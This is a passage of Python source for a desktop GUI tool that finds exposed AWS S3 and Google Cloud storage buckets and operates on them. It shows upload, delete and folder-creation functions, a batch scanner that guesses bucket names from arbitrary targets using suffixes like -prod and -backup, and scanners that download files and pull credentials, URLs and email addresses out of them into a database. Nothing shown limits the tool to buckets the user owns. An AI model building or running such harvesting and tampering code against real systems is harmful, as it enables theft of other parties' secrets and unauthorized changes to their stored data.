        if not messagebox.askyesno("Confirm Delete", f"Delete {file_path}?"):
            return
        
        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{file_path}"
        
        self.fm_status_var.set(f"Deleting {file_path}...")
        
        def delete_task():
            try:
                resp = self.session.delete(url)
                if resp.status_code in [200, 204]:
                    self.root.after(0, lambda: self.fm_on_delete_complete(file_path))
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Delete failed: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))
        
        threading.Thread(target=delete_task, daemon=True).start()
    
    def fm_on_delete_complete(self, file_path: str):
        """Handle delete completion"""
        self.fm_status_var.set(f"Deleted: {file_path}")
        self.log(f"Deleted: {file_path}")
        self.fm_refresh_bucket()
        messagebox.showinfo("Success", f"Deleted: {file_path}")
    
    def fm_upload_file(self):
        """Upload file to current bucket"""
        if not self.fm_current_bucket:
            messagebox.showwarning("Warning", "Load a bucket first!")
            return

        file_path = filedialog.askopenfilename(title="Select file to upload")
        if not file_path:
            return

        remote_path = simpledialog.askstring("Remote Path", "Enter remote path (including folder if needed):",
                                             initialvalue=os.path.basename(file_path))
        if not remote_path:
            return

        default_content_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
        custom_content_type = simpledialog.askstring(
            "Content-Type",
            "Enter Content-Type (MIME type) for upload:",
            initialvalue=default_content_type
        )
        if custom_content_type is None:
            return
        content_type = custom_content_type.strip() or default_content_type

        with open(file_path, 'rb') as f:
            content = f.read()

        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{remote_path}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{remote_path}"

        self.fm_status_var.set(f"Uploading {remote_path}...")

        def upload_task():
            try:
                resp = self.session.put(url, data=content, headers={'Content-Type': content_type})
                if resp.status_code == 200:
                    self.root.after(0, lambda: self.fm_on_upload_complete(remote_path))
                    self.log(f"Uploaded: {remote_path} | Content-Type: {content_type} | Provider: {self.fm_current_bucket.provider.value}")
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Upload failed: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))

        threading.Thread(target=upload_task, daemon=True).start()
    
    def fm_on_upload_complete(self, remote_path: str):
        """Handle upload completion"""
        self.fm_status_var.set(f"Uploaded: {remote_path}")
        self.log(f"Uploaded: {remote_path}")
        self.fm_refresh_bucket()
        messagebox.showinfo("Success", f"Uploaded:\n{remote_path}")
    
    def fm_new_folder(self):
        """Create new folder in bucket"""
        if not self.fm_current_bucket:
            messagebox.showwarning("Warning", "Load a bucket first!")
            return
        
        folder_name = simpledialog.askstring("New Folder", "Enter folder name:")
        if not folder_name:
            return
        
        # Create a placeholder file to represent folder
        remote_path = f"{folder_name}/.folder"
        
        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{remote_path}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{remote_path}"
        
        self.fm_status_var.set(f"Creating folder {folder_name}...")
        
        def create_task():
            try:
                resp = self.session.put(url, data=b'')
                if resp.status_code == 200:
                    self.root.after(0, lambda: self.fm_on_folder_created(folder_name))
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Failed to create folder: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))
        
        threading.Thread(target=create_task, daemon=True).start()
    
    def fm_on_folder_created(self, folder_name: str):
        """Handle folder creation"""
        self.fm_status_var.set(f"Created folder: {folder_name}")
        self.log(f"Created folder: {folder_name}")
        self.fm_refresh_bucket()
        messagebox.showinfo("Success", f"Folder created: {folder_name}")
    
    def fm_scan_credentials(self):
        """Scan current bucket for credentials (threaded + batched UI updates to prevent freezing)."""
        if not self.fm_current_bucket or not self.fm_all_files:
            messagebox.showwarning("Warning", "Load a bucket first!")
            return

        # Prevent concurrent scans that can freeze UI
        if getattr(self, "_fm_cred_scan_running", False):
            messagebox.showinfo("Info", "Credential scan is already running.")
            return

        self._fm_cred_scan_running = True
        self.fm_status_var.set("Scanning for credentials...")
        self.fm_progress.start()

        def scan_task():
            found = 0
            scanned = 0
            pending_rows = []
            max_files = min(100, len(self.fm_all_files))

            for file_info in self.fm_all_files[:100]:
                scanned += 1
                if self.fm_current_bucket.provider == Provider.AWS_S3:
                    url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{file_info.path}"
                else:
                    url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{file_info.path}"

                try:
                    resp = self.session.get(url, timeout=10)
                    if resp.status_code == 200:
                        content = resp.content.decode('utf-8', errors='ignore')
                        for pattern, cred_type, severity in self.sensitive_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            for match in matches:
                                parts = f"{cred_type}: {match[:100]}".split(':', 1)
                                parsed_type = parts[0] if len(parts) > 0 else "Unknown"
                                parsed_value = parts[1].strip() if len(parts) > 1 else ""
                                pending_rows.append((
                                    self.fm_current_bucket.name,
                                    file_info.path[:50],
                                    parsed_type,
                                    parsed_value[:100],
                                    severity.upper(),
                                    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                    severity.lower(),
                                    self.fm_current_bucket.name,
                                    file_info.path,
                                    parsed_type,
                                    parsed_value[:200],
                                    severity,
                                    datetime.now().isoformat()
                                ))
                                found += 1
                except:
                    pass

                # Batch flush every 20 files to keep UI responsive
                if scanned % 20 == 0 and pending_rows:
                    rows_to_flush = pending_rows[:]
                    pending_rows.clear()

                    def flush_rows(rows=rows_to_flush, s=scanned, m=max_files, f=found):
                        if hasattr(self, 'cred_tree'):
                            for r in rows:
                                self.cred_tree.insert('', 0, values=(r[0], r[1], r[2], r[3], r[4], r[5]), tags=(r[6],))
                        with self.db_lock:
                            for r in rows:
                                self.cursor.execute('''
                                    INSERT INTO credentials (bucket_name, file_path, credential_type, credential_value, severity, found_timestamp)
                                    VALUES (?, ?, ?, ?, ?, ?)
                                ''', (r[7], r[8], r[9], r[10], r[11], r[12]))
                            self.conn.commit()
                        self.fm_status_var.set(f"Scanning credentials... {s}/{m} files | found: {f}")
                        self.update_dashboard_stats()

                    self.root.after(0, flush_rows)

            # Final flush
            if pending_rows:
                rows_to_flush = pending_rows[:]
                pending_rows.clear()

                def final_flush(rows=rows_to_flush):
                    if hasattr(self, 'cred_tree'):
                        for r in rows:
                            self.cred_tree.insert('', 0, values=(r[0], r[1], r[2], r[3], r[4], r[5]), tags=(r[6],))
                    with self.db_lock:
                        for r in rows:
                            self.cursor.execute('''
                                INSERT INTO credentials (bucket_name, file_path, credential_type, credential_value, severity, found_timestamp)
                                VALUES (?, ?, ?, ?, ?, ?)
                            ''', (r[7], r[8], r[9], r[10], r[11], r[12]))
                        self.conn.commit()
                    self.update_dashboard_stats()

                self.root.after(0, final_flush)

            def finish():
                self._fm_cred_scan_running = False
                self.fm_on_scan_complete(found)

            self.root.after(0, finish)

        threading.Thread(target=scan_task, daemon=True).start()
    
    def fm_on_scan_complete(self, found: int):
        """Handle credential scan completion"""
        self.fm_progress.stop()
        self.fm_status_var.set(f"Scan complete! Found {found} credentials")
        messagebox.showinfo("Scan Complete", f"Found {found} credentials!\nCheck the Credentials tab.")
    
    def fm_open_in_browser(self):
        """Open selected file in browser"""
        selection = self.fm_files_tree.selection()
        if not selection:
            return
        
        item = self.fm_files_tree.item(selection[0])
        file_path = item['tags'][0] if item['tags'] else None
        
        if file_path and self.fm_current_bucket:
            if self.fm_current_bucket.provider == Provider.AWS_S3:
                url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{file_path}"
            else:
                url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{file_path}"
            
            webbrowser.open(url)
            self.log(f"Opened in browser: {url}")
    
    def fm_show_stats(self):
        """Show bucket statistics"""
        if not self.fm_current_bucket:
            return
        
        bucket = self.fm_current_bucket
        stats = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                          BUCKET STATISTICS                                     ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  Name: {bucket.name:<66} ║
║  Provider: {bucket.provider.value:<60} ║
║  Region: {bucket.region:<65} ║
║  URL: {bucket.url[:65]:<65} ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                          FILE STATISTICS                                 │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │                                                                         │ ║
║  │  Total Files: {bucket.total_files:<63} │ ║
║  │  Total Size: {self.format_size(bucket.total_size):<61} │ ║
║  │                                                                         │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                        SECURITY STATUS                                   │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │                                                                         │ ║
║  │  Public Read: {'✅ YES' if bucket.is_public_read else '❌ NO':<64} │ ║
║  │  Public Write: {'⚠️ YES' if bucket.is_public_write else '❌ NO':<63} │ ║
║  │  Risk Score: {bucket.risk_score}/100 ({bucket.risk_level:<51}) │ ║
║  │                                                                         │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        messagebox.showinfo("Bucket Statistics", stats)
    
    def fm_add_bucket(self):
        """Add manual bucket to file manager"""
        bucket_name = simpledialog.askstring("Add Bucket", "Enter bucket name:")
        if not bucket_name:
            return
        
        provider = self.detect_provider(bucket_name)
        bucket_info = BucketInfo(
            name=bucket_name,
            provider=provider,
            url=f"https://{bucket_name}.s3.amazonaws.com/" if provider == Provider.AWS_S3 else f"https://storage.googleapis.com/{bucket_name}/"
        )
        
        self.buckets.append(bucket_info)
        self.update_bucket_combo()
        self.fm_bucket_var.set(bucket_name)
        self.fm_load_bucket()
    
    def fm_refresh_bucket(self):
        """Refresh current bucket"""
        if self.fm_current_bucket:
            self.fm_load_bucket()
    
    def fm_show_context_menu(self, event):
        """Show context menu for files"""
        selection = self.fm_files_tree.selection()
        if not selection:
            return
        
        item = self.fm_files_tree.item(selection[0])
        file_path = item['tags'][0] if item['tags'] else ""
        
        menu = tk.Menu(self.root, tearoff=0)
        menu.add_command(label="📝 Edit", command=self.fm_edit_file)
        menu.add_command(label="📥 Download", command=self.fm_download_selected)
        menu.add_command(label="🗑 Delete", command=self.fm_delete_selected, foreground=self.colors['danger'])
        menu.add_separator()
        menu.add_command(label="🌐 Open in Browser", command=self.fm_open_in_browser)
        menu.add_command(label="📋 Copy Path", command=self.fm_copy_path)
        menu.add_separator()
        menu.add_command(label="🔐 Scan for Credentials", command=lambda: self.scan_file_for_credentials(
            self.fm_current_bucket.name if self.fm_current_bucket else "", file_path,
            self.fm_current_bucket.provider if self.fm_current_bucket else Provider.UNKNOWN))
        
        menu.post(event.x_root, event.y_root)
    
    def fm_show_error(self, error: str):
        """Show error in file manager"""
        self.fm_progress.stop()
        self.fm_status_var.set(f"Error: {error}")
        messagebox.showerror("Error", error)
    
    # ========================================================================
    # BROWSER METHODS
    # ========================================================================
    
    def browser_load_bucket(self):
        """Load bucket in browser"""
        bucket_name = self.browser_bucket_var.get().strip()
        if not bucket_name:
            return
        
        bucket = next((b for b in self.buckets if b.name == bucket_name), None)
        if not bucket:
            provider = self.detect_provider(bucket_name)
            if provider == Provider.UNKNOWN:
                messagebox.showwarning("Warning", f"Bucket '{bucket_name}' was not detected on AWS/GCS.")
                return
            bucket = BucketInfo(name=bucket_name, provider=provider, url="")
        
        self.browser_current_bucket = bucket

        if not bucket.files:
            files = self.get_all_files_from_bucket(bucket.name, bucket.provider)
            bucket.files = files
            bucket.total_files = len(files)
            bucket.total_size = sum(f.size for f in files)
            self.update_results_tab()
            self.update_dashboard_stats()

        self.browser_load_files()
    
    def browser_load_files(self):
        """Load files in browser"""
        for item in self.browser_tree.get_children():
            self.browser_tree.delete(item)
        
        if not hasattr(self, 'browser_current_bucket'):
            return
        
        for file_info in self.browser_current_bucket.files:
            size_str = self.format_size(file_info.size)
            icon = self.get_file_icon(file_info.name)
            self.browser_tree.insert('', 'end', text=f"{icon} {file_info.path}", 
                                     values=(size_str, file_info.last_modified[:16] if file_info.last_modified else "Unknown",
                                            file_info.file_type.value))
    
    def browser_filter_files(self):
        """Filter files in browser"""
        filter_text = self.browser_filter_var.get().lower()
        for item in self.browser_tree.get_children():
            self.browser_tree.delete(item)
        
        if not filter_text:
            self.browser_load_files()
            return
        
        if not hasattr(self, 'browser_current_bucket'):
            return
        
        for file_info in self.browser_current_bucket.files:
            if filter_text in file_info.path.lower():
                size_str = self.format_size(file_info.size)
                icon = self.get_file_icon(file_info.name)
                self.browser_tree.insert('', 'end', text=f"{icon} {file_info.path}",
                                        values=(size_str, file_info.last_modified[:16] if file_info.last_modified else "Unknown",
                                               file_info.file_type.value))
    
    def browser_open_file(self, event):
        """Open file in browser"""
        selection = self.browser_tree.selection()
        if not selection:
            return
        
        file_path = self.browser_tree.item(selection[0])['text']
        # Remove icon
        if file_path.startswith("📄 ") or file_path.startswith("🖼️ ") or file_path.startswith("📜 "):
            file_path = file_path[2:]
        
        if self.browser_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.browser_current_bucket.name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{self.browser_current_bucket.name}/{file_path}"
        
        webbrowser.open(url)
    
    def browser_show_stats(self):
        """Show bucket statistics"""
        if not hasattr(self, 'browser_current_bucket'):
            return
        self.fm_show_stats()
    
    def browser_download_all(self):
        """Download all files from bucket"""
        if not hasattr(self, 'browser_current_bucket'):
            return
        
        if messagebox.askyesno("Confirm Download", f"Download all {len(self.browser_current_bucket.files)} files?"):
            for file_info in self.browser_current_bucket.files:
                self.fm_download_file(file_info.path)
    
    def browser_scan_all(self):
        """Scan all files for credentials"""
        if not hasattr(self, 'browser_current_bucket'):
            return
        
        self.fm_scan_credentials()
    
    def browser_refresh(self):
        """Refresh browser"""
        self.browser_load_bucket()
    
    def browser_context_menu(self, event):
        """Context menu for browser"""
        selection = self.browser_tree.selection()
        if not selection:
            return
        
        item_text = self.browser_tree.item(selection[0])['text']
        # Remove icon if present
        if item_text.startswith("📄 ") or item_text.startswith("🖼️ ") or item_text.startswith("📜 "):
            file_path = item_text[2:]
        else:
            file_path = item_text
        
        menu = tk.Menu(self.root, tearoff=0)
        menu.add_command(label="🌐 Open in Browser", command=lambda: self.browser_open_file(None))
        menu.add_command(label="📥 Download", command=lambda: self.fm_download_file(file_path))
        menu.add_command(label="📋 Copy URL", command=lambda: self.copy_to_clipboard(
            f"https://{self.browser_current_bucket.name}.s3.amazonaws.com/{file_path}" if self.browser_current_bucket.provider == Provider.AWS_S3 else f"https://storage.googleapis.com/{self.browser_current_bucket.name}/{file_path}"))
        menu.add_separator()
        menu.add_command(label="🔐 Scan for Credentials", command=lambda: self.scan_file_for_credentials(
            self.browser_current_bucket.name, file_path, self.browser_current_bucket.provider))
        menu.add_command(label="ℹ️ File Info", command=lambda: self.show_file_info(file_path))
        menu.post(event.x_root, event.y_root)
    
    def show_file_info(self, file_path: str):
        """Show detailed file information"""
        if not hasattr(self, 'browser_current_bucket'):
            return
        
        # Find file info
        file_info = None
        for f in self.browser_current_bucket.files:
            if f.path == file_path:
                file_info = f
                break
        
        if not file_info:
            messagebox.showinfo("File Info", f"File: {file_path}\nInfo not available")
            return
        
        info = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              FILE INFORMATION                                  ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  Name: {file_info.name:<66} ║
║  Path: {file_info.path[:66]:<66} ║
║  Size: {self.format_size(file_info.size):<66} ║
║  Type: {file_info.file_type.value:<66} ║
║  Content Type: {file_info.content_type[:60]:<60} ║
║  Last Modified: {file_info.last_modified[:60]:<60} ║
║  MD5 Hash: {file_info.hash_md5[:60]:<60} ║
║                                                                               ║
║  Contains Credentials: {'✅ YES' if file_info.contains_credentials else '❌ NO':<52} ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        messagebox.showinfo("File Information", info)
    
    # ========================================================================
    # ADDITIONAL TOOL WINDOWS
    # ========================================================================
    
    def open_batch_scanner(self):
        """Open batch scanner window"""
        win = tk.Toplevel(self.root)
        win.title("Batch Scanner")
        win.geometry("800x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Batch Scanner", style='Title.TLabel').pack(pady=10)
        
        ttk.Label(win, text="Targets (one per line):", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        targets_text = scrolledtext.ScrolledText(win, height=10, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        targets_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Label(win, text="Provider:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        provider_var = tk.StringVar(value="Both")
        provider_combo = ttk.Combobox(win, textvariable=provider_var, values=["AWS S3", "Google GCS", "Both"], width=20)
        provider_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        ttk.Label(win, text="Scan Options:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        deep_scan_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(win, text="Deep Scan", variable=deep_scan_var).pack(anchor=tk.W, padx=10)
        
        cred_scan_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(win, text="Extract Credentials", variable=cred_scan_var).pack(anchor=tk.W, padx=10)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=12, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def start_batch():
            targets = targets_text.get(1.0, tk.END).strip().split('\n')
            targets = [t.strip() for t in targets if t.strip()]
            if not targets:
                messagebox.showwarning("Warning", "Enter at least one target!")
                return
            
            progress.start()
            status_var.set(f"Scanning {len(targets)} targets...")
            results_text.delete(1.0, tk.END)
            
            def scan_task():
                found_total = 0
                for i, target in enumerate(targets):
                    results_text.insert(tk.END, f"\n{'='*50}\n")
                    results_text.insert(tk.END, f"Scanning target {i+1}/{len(targets)}: {target}\n")
                    results_text.insert(tk.END, f"{'='*50}\n")
                    results_text.see(tk.END)
                    
                    # Generate variations
                    base = target.replace('.', '-').replace('_', '-')
                    base = re.sub(r'[^a-zA-Z0-9-]', '', base)
                    
                    variations = [
                        base, f"{base}-prod", f"{base}-dev", f"{base}-test",
                        f"{base}-backup", f"{base}-cdn", f"cdn-{base}",
                        f"{base}-assets", f"assets-{base}"
                    ]
                    
                    provider = provider_var.get()
                    for bucket in variations:
                        detected = self.detect_provider(bucket)
                        if detected != Provider.UNKNOWN:
                            if provider == "Both" or detected.value == provider:
                                results_text.insert(tk.END, f"✅ FOUND: {bucket} ({detected.value})\n")
                                found_total += 1
                                self.scan_bucket_content(bucket, detected)
                            results_text.see(tk.END)
                    
                    time.sleep(0.5)
                
                progress.stop()
                status_var.set(f"Batch scan complete! Found {found_total} buckets")
                results_text.insert(tk.END, f"\n{'='*50}\n")
                results_text.insert(tk.END, f"✅ Batch scan completed! Found {found_total} buckets total.\n")
                messagebox.showinfo("Batch Scan Complete", f"Found {found_total} buckets across {len(targets)} targets!")
            
            threading.Thread(target=scan_task, daemon=True).start()
        
        ttk.Button(win, text="Start Batch Scan", command=start_batch, style='Success.TButton').pack(pady=10)
    
    def open_credential_scanner(self):
        """Open credential scanner window"""
        self.credential_scan_active = False
        self.credential_scan_stop_requested = False

        win = tk.Toplevel(self.root)
        win.title("Credential Scanner")
        win.geometry("1000x800")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Credential Scanner", style='Title.TLabel').pack(pady=10)
        
        # Selection frame
        select_frame = ttk.Frame(win)
        select_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(select_frame, text="Select Bucket:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        bucket_var = tk.StringVar()
        bucket_combo = ttk.Combobox(select_frame, textvariable=bucket_var, width=40)
        bucket_combo['values'] = [b.name for b in self.buckets]
        bucket_combo.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(select_frame, text="Or Enter URL:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
        url_var = tk.StringVar()
        ttk.Entry(select_frame, textvariable=url_var, width=50).pack(side=tk.LEFT, padx=5)
        
        # Options
        options_frame = ttk.LabelFrame(win, text="Scan Options")
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        max_files_var = tk.IntVar(value=100)
        ttk.Label(options_frame, text="Max Files to Scan:").pack(side=tk.LEFT, padx=10)
        ttk.Spinbox(options_frame, from_=10, to=1000, textvariable=max_files_var, width=10).pack(side=tk.LEFT, padx=5)
        
        scan_all_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="Scan All Files", variable=scan_all_var).pack(side=tk.LEFT, padx=20)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=20, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def safe_ui(callable_fn):
            try:
                if win.winfo_exists():
                    self.root.after(0, callable_fn)
            except:
                pass

        def request_stop():
            self.credential_scan_stop_requested = True
            self.credential_scan_active = False
            status_var.set("Stopping credential scan...")
            self.log("Credential scan stop requested")

        def start_scan():
            bucket_name = bucket_var.get()
            url = url_var.get().strip()
            
            if not bucket_name and not url:
                messagebox.showwarning("Warning", "Select a bucket or enter a URL!")
                return
            
            if url:
                # Extract bucket name from URL
                import re
                match = re.search(r'https?://([^./]+)\.', url)
                if match:
                    bucket_name = match.group(1)
                else:
                    messagebox.showerror("Error", "Could not extract bucket name from URL")
                    return
            
            bucket = next((b for b in self.buckets if b.name == bucket_name), None)
            if not bucket:
                provider = self.detect_provider(bucket_name)
                if provider == Provider.UNKNOWN:
                    messagebox.showerror("Error", "Bucket not found or not accessible!")
                    return
                bucket = BucketInfo(name=bucket_name, provider=provider, url="")
            
            max_files = max_files_var.get() if not scan_all_var.get() else len(bucket.files)
            
            self.credential_scan_active = True
            self.credential_scan_stop_requested = False

            progress.start()
            status_var.set(f"Scanning {min(max_files, len(bucket.files))} files...")
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🔍 Scanning bucket: {bucket_name}\n")
            results_text.insert(tk.END, f"Provider: {bucket.provider.value}\n")
            results_text.insert(tk.END, f"Total files: {len(bucket.files)}\n")
            results_text.insert(tk.END, f"Files to scan: {min(max_files, len(bucket.files))}\n")
            results_text.insert(tk.END, "=" * 60 + "\n\n")
            
            def scan_task():
                found = 0
                scanned = 0

                try:
                    for file_info in bucket.files[:max_files]:
                        if self.credential_scan_stop_requested:
                            break

                        scanned += 1
                        safe_ui(lambda s=scanned, p=file_info.path: status_var.set(
                            f"Scanning {s}/{min(max_files, len(bucket.files))}: {p[:50]}..."
                        ))
                        safe_ui(lambda p=file_info.path: results_text.insert(tk.END, f"Scanning: {p}\n"))
                        safe_ui(lambda: results_text.see(tk.END))

                        if bucket.provider == Provider.AWS_S3:
                            file_url = f"https://{bucket_name}.s3.amazonaws.com/{file_info.path}"
                        else:
                            file_url = f"https://storage.googleapis.com/{bucket_name}/{file_info.path}"

                        try:
                            resp = self.session.get(file_url, timeout=10, verify=self.settings.get('verify_ssl', True))
                            if resp.status_code == 200:
                                content = resp.content.decode('utf-8', errors='ignore')
                                for pattern, cred_type, severity in self.sensitive_patterns:
                                    if self.credential_scan_stop_requested:
                                        break
                                    matches = re.findall(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        if self.credential_scan_stop_requested:
                                            break
                                        safe_ui(lambda c=cred_type, m=match: results_text.insert(tk.END, f"  🔑 {c}: {str(m)[:100]}\n"))
                                        self.save_credential(bucket_name, file_info.path, f"{cred_type}: {str(match)[:100]}", severity)
                                        found += 1
                        except requests.exceptions.RequestException:
                            pass
                        except Exception as e:
                            self.log(f"Credential scan error in {file_info.path}: {str(e)}")

                    if self.credential_scan_stop_requested:
                        safe_ui(lambda: status_var.set(f"Stopped. Found {found} credentials in {scanned} files"))
                        safe_ui(lambda: results_text.insert(tk.END, f"\n⏹️ Scan stopped by user. Found {found} credentials in {scanned} files.\n"))
                    else:
                        safe_ui(lambda: status_var.set(f"Scan complete! Found {found} credentials"))
                        safe_ui(lambda: results_text.insert(tk.END, f"\n{'='*60}\n"))
                        safe_ui(lambda: results_text.insert(tk.END, f"✅ Scan complete! Found {found} credentials in {scanned} files.\n"))
                        safe_ui(lambda: messagebox.showinfo("Scan Complete", f"Found {found} credentials!"))
                finally:
                    self.credential_scan_active = False
                    safe_ui(lambda: progress.stop())
            
            threading.Thread(target=scan_task, daemon=True).start()
        
        btns = ttk.Frame(win)
        btns.pack(pady=10)
        ttk.Button(btns, text="Start Scan", command=start_scan, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btns, text="⏹️ Stop Search", command=request_stop, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
    
    def open_url_extractor(self):
        """Open URL extractor window"""
        win = tk.Toplevel(self.root)
        win.title("URL Extractor")
        win.geometry("900x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="URL Extractor", style='Title.TLabel').pack(pady=10)
        
        select_frame = ttk.Frame(win)
        select_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(select_frame, text="Select Bucket:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        bucket_var = tk.StringVar()
        bucket_combo = ttk.Combobox(select_frame, textvariable=bucket_var, width=40)
        bucket_combo['values'] = [b.name for b in self.buckets]
        bucket_combo.pack(side=tk.LEFT, padx=5)
        
        max_files_var = tk.IntVar(value=50)
        ttk.Label(select_frame, text="Max Files:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
        ttk.Spinbox(select_frame, from_=10, to=500, textvariable=max_files_var, width=10).pack(side=tk.LEFT, padx=5)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=20, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def extract_urls():
            bucket_name = bucket_var.get()
            if not bucket_name:
                messagebox.showwarning("Warning", "Select a bucket!")
                return
            
            bucket = next((b for b in self.buckets if b.name == bucket_name), None)
            if not bucket:
                messagebox.showerror("Error", "Bucket not found!")
                return
            
            max_files = max_files_var.get()
            progress.start()
            status_var.set(f"Extracting URLs from {min(max_files, len(bucket.files))} files...")
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🌐 Extracting URLs from bucket: {bucket_name}\n")
            results_text.insert(tk.END, "=" * 60 + "\n\n")
            
            all_urls = set()
            
            def extract_task():
                scanned = 0
                for file_info in bucket.files[:max_files]:
                    scanned += 1
                    status_var.set(f"Processing {scanned}/{min(max_files, len(bucket.files))}: {file_info.path[:50]}...")
                    win.update()
                    
                    if bucket.provider == Provider.AWS_S3:
                        url = f"https://{bucket_name}.s3.amazonaws.com/{file_info.path}"
                    else:
                        url = f"https://storage.googleapis.com/{bucket_name}/{file_info.path}"
                    
                    try:
                        resp = self.session.get(url, timeout=10)
                        if resp.status_code == 200:
                            content = resp.content.decode('utf-8', errors='ignore')
                            urls = re.findall(r'https?://[^\s<>"\'\)\]]+', content)
                            for u in urls:
                                all_urls.add(u)
                    except:
                        pass
                
                progress.stop()
                status_var.set(f"Extraction complete! Found {len(all_urls)} unique URLs")
                results_text.insert(tk.END, f"\n📊 Found {len(all_urls)} unique URLs:\n\n")
                for u in sorted(all_urls):
                    results_text.insert(tk.END, f"{u}\n")
                messagebox.showinfo("Extraction Complete", f"Found {len(all_urls)} URLs!")
            
            threading.Thread(target=extract_task, daemon=True).start()
        
        ttk.Button(win, text="Extract URLs", command=extract_urls, style='Primary.TButton').pack(pady=10)
    
    def open_email_extractor(self):
        """Open email extractor window"""
        win = tk.Toplevel(self.root)
        win.title("Email Extractor")
        win.geometry("900x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Email Extractor", style='Title.TLabel').pack(pady=10)
        
        select_frame = ttk.Frame(win)
        select_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(select_frame, text="Select Bucket:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        bucket_var = tk.StringVar()
        bucket_combo = ttk.Combobox(select_frame, textvariable=bucket_var, width=40)
        bucket_combo['values'] = [b.name for b in self.buckets]
        bucket_combo.pack(side=tk.LEFT, padx=5)
        
        max_files_var = tk.IntVar(value=50)
        ttk.Label(select_frame, text="Max Files:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
